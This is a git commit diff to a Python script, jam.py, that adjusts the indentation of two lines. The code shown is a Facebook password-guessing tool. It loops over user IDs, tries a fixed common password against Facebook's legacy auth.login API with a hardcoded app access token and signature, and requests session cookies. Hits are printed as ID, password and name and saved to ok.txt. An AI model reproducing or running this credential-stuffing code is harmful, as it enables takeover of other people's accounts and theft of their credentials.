29c419710ea6f02c6f846920ad54686a7f300ddf
Blacklisted-CKG <80424711+Blacklisted-CKG@users.noreply.github.com>
2021-04-04 12:59:06 -0700

    Update jam.py

--- jam.py
+++ jam.py
@@ -369,8 +369,8 @@ def b_menu_select():
 		                            oks.append(uid)
 		                        else:
 		                            pass6="223344"
-					   q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		                           d=json.loads(q)
+					    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+		                            d=json.loads(q)
 		                            if 'access_token' in d:
 		                                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass6+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                ok=open("ok.txt","a")
